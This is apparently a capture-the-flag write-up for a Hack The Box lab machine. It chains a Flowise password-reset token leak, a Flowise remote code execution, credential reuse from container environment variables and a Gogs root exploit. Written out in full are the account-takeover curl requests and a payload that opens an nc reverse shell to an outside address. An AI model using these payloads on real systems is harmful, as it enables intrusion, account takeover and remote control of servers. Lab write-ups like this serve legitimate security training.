

# Enum
 `nmap -sC -sV -T4 -vv -oN nmap.txt 10.129.32.34`
 22 ssh open, 80http
# Virutal Host Fuzzing
`ffuf -u "http://silentium.htb/" -H "Host: FUZZ.silentium.htb" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -fc 301`

`staging                 [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 36ms]`

staging.silentium.htb is running Flowise 3.0.5
# Gaining user
[CVE-2025-58434](https://github.com/advisories/GHSA-wgpv-6j63-x5ph)
```
curl -i -X POST https://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb"}}'
```

201 Created
```json
{"user":{"id":"e26c9d6c-678c-4c10-9e36-01813e8fea73","name":"admin","email":"ben@silentium.htb","credential":"$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG","tempToken":"mlKjespwPnypkQOb5SpJ6ripjEOCchPoS2xe6wtUbrLgLtQRDHeY8d9R97RiT6tu","tokenExpiry":"2026-05-16T16:32:10.569Z","status":"active","createdDate":"2026-01-29T20:14:57.000Z","updatedDate":"2026-05-16T16:17:10.000Z","createdBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73","updatedBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73"},"organization":{},"organizationUser":{},"workspace":{},"workspaceUser":{},"role":{}}
```

2. **Use the exposed `tempToken` to reset the password**

```shell
curl -i -X POST https://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -d '{
        "user":{
          "email":"ben@silentium.htb",
          "tempToken":"mlKjespwPnypkQOb5SpJ6ripjEOCchPoS2xe6wtUbrLgLtQRDHeY8d9R97RiT6tu",
          "password":"NewSecurePassword123!"
        }
      }'
```

**Expected Result:** `200 OK`  

The password for the victim's account was reset, enabling full access.

[CVE-2025-59528](https://github.com/advisories/GHSA-3gcm-f6qx-ff7p)
Login and get the API key from http://staging.silentium.htb/apikey
 ```shell
curl -s http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -X POST \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer tmY1fIjgqZ6-nWUuZ9G7VzDtlsOiSZlDZjFSxZrDd0Q" \
  -d '{"loadMethod":"listActions","inputs":{"mcpServerConfig":"({x:(()=>{process.mainModule.require(\"child_process\").exec(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.177 9494 >/tmp/f\");return 1;})()})"}}'
 ```
# Container escape

```cmd
/ # env
FLOWISE_PASSWORD=F1l3_d0ck3r
ALLOW_UNAUTHORIZED_CERTS=true
NODE_VERSION=20.19.4
HOSTNAME=c78c3cceb7ba
YARN_VERSION=1.22.22
SMTP_PORT=1025
SHLVL=3
PORT=3000
HOME=/root
SENDER_EMAIL=ben@silentium.htb
PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser
JWT_ISSUER=ISSUER
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
LLM_PROVIDER=nvidia-nim
SMTP_USERNAME=test
SMTP_SECURE=false
JWT_REFRESH_TOKEN_EXPIRY_IN_MINUTES=43200
FLOWISE_USERNAME=ben
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
DATABASE_PATH=/root/.flowise
JWT_TOKEN_EXPIRY_IN_MINUTES=360
JWT_AUDIENCE=AUDIENCE
SECRETKEY_PATH=/root/.flowise
PWD=/
SMTP_PASSWORD=r04D!!_R4ge
NVIDIA_NIM_LLM_MODE=managed
SMTP_HOST=mailhog
JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
SMTP_USER=test

```
## Credentials for SSH

`ben:r04D!!_R4ge`

ssh to the host

`ssh ben@silentium.htb`

# Privilege Escalation 
`ben@silentium:~$ netstat -tunap`

The Gogs application is running on port 3001 as root.

## SSH tunel
`ssh ben@silentium.htb -L 3001:127.0.0.1:3001`

access the website: http://127.0.0.1:3001

register an account and generate the API token

[use this POC](https://github.com/TYehan/CVE-2025-8110-Gogs-RCE-Exploit)
or do it manually

https://www.wiz.io/blog/wiz-research-gogs-cve-2025-8110-rce-exploit

# ROOTED!

